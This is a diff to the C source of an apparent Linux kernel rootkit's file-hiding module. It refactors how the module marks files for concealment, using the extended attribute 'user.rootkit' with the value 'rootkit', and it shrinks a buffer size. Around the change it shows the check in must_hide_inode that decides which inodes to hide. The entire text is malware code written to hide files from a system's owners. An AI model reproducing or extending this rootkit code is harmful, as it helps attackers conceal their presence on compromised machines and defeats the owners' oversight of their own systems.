@@ -2,11 +2,14 @@
 #include <linux/fs.h>
 #include <linux/fdtable.h>
 
+#define FILEHIDE_XATTR_NAME "user.rootkit"
+#define FILEHIDE_XATTR_VAL "rootkit"
+
 #include "common.h"
 #include "filehide.h"
 #include "hook.h"
 
-#define SIZE 512
+#define SIZE 64
 
 void
 hide_files(void)
@@ -34,9 +37,9 @@ must_hide_inode(struct dentry *dentry)
 
     if(dentry && dentry->d_inode)
         if(!inode_permission(dentry->d_inode, MAY_READ)) {
-            ssize_t len = vfs_getxattr(dentry, "user.rootkit", buf, SIZE);
+            ssize_t len = vfs_getxattr(dentry, FILEHIDE_XATTR_NAME, buf, SIZE);
 
-            if (len > 0 && !strncmp("rootkit", buf, len))
+            if (len > 0 && !strncmp(FILEHIDE_XATTR_VAL, buf, len))
                 return dentry->d_inode->i_ino;
         }
 
